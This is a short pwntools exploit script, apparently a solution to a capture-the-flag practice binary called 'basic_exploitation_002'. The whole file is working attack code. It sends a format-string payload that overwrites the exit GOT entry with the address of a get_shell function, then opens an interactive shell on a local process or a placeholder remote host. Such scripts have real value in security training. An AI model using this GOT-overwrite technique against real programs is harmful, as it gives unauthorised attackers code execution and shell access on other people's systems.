#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_exploitation_002_patched")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main") 
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()
    get_shell = 0x8048609
    payload = b'%2052c%7$hn %32260c%8$hn' + p32 (exe.got['exit'] + 2) + p32 (exe.got['exit'])
    p.send (payload)

    p.interactive()


if __name__ == "__main__":
    main()
